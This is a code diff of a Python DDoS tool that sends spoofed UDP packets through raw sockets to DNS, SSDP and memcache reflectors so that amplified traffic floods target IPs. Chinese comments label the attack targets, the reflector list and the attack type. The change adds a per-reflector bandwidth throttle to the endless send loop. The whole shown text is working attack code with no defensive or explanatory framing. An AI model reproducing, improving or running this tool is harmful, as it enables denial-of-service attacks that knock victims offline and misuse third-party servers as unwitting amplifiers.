@@ -16,6 +16,7 @@ switch_time = 0 #切换ip攻击列表间隔时间（单位/s）|值为0则不切
 target_dir = 'ip.txt'#攻击ip,CIDR格式
 soldier_dir = 'new.txt'#反射ip
 ddos_type = 'ssdp'#攻击类型
+soldier_size = 50 #反射ip给予带宽大小,(单位/kbps)
 PAYLOAD = {
 	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
 			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
@@ -36,20 +37,21 @@ PORT = {
 	'ssdp': 1900,
 	'memcache':11211}
 def attack(soldier,target):
-	leng = 97
+	
 	proto = ddos_type
 	payload = PAYLOAD[proto]
 	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 	udp = UDP(randint(1, 65535), PORT[proto], payload).pack(target, soldier)
 	ip = IP(target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
+	data_pack,length,size = [ip+udp+payload,len(ip+udp+payload),(soldier_size*1024)/8]
+	i = 0
 	while True:
-		
-		sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
-		LENG = divmod(leng,97)
-		if LENG[0] == 20 and LENG[1] == 0:
-			leng = 97
+		sock.sendto(data_pack, (soldier, PORT[proto]))
+		i = i+length
+		if i>=size:
 			time.sleep(1)
-		leng = leng+97;
+			i = 0
+
 	
 def ddos_1(soldier):
 
